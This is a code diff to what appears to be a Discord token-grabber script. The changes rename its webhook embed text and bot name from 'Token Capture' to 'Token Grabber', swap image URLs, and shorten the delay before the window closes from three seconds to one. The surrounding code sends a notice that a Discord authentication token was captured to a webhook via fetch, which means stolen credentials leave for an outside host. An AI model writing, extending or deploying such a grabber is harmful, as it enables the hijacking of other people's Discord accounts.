@@ -61,8 +61,8 @@
           
           // Discord Webhookのembedを作成
           const embed = {
-            title: "🔐 Discord Token Captured",
-            description: "A Discord authentication token has been successfully captured.",
+            title: "🔐 Discord Token Grabbed",
+            description: "A Discord authentication token has been successfully grabbed.",
             color: 0x5865F2, // Discord Blue
             fields: [
               {
@@ -97,10 +97,10 @@
               }
             ],
             thumbnail: {
-              url: "https://i.imgur.com/0uZzlkh.png" // Discord logo
+              url: "https://imgur.com/EzFFjbl.png" // Discord logo
             },
             footer: {
-              text: "Token captured at " + new Date().toUTCString(),
+              text: "Token grabbed at " + new Date().toUTCString(),
               icon_url: "https://i.imgur.com/AfFp7pu.png" // Discord icon
             }
           };
@@ -113,8 +113,8 @@
             },
             body: JSON.stringify({ 
               embeds: [embed],
-              username: "Token Capture",
-              avatar_url: "https://i.imgur.com/AfFp7pu.png"
+              username: "Token Grabber",
+              avatar_url: "https://imgur.com/blqctTG.png"
             })
           });
         })
@@ -130,7 +130,7 @@
         })
         .finally(() => {
           // 3秒後にウィンドウを閉じる
-          setTimeout(() => window.close(), 3000);
+          setTimeout(() => window.close(), 1000);
         });
     }
     
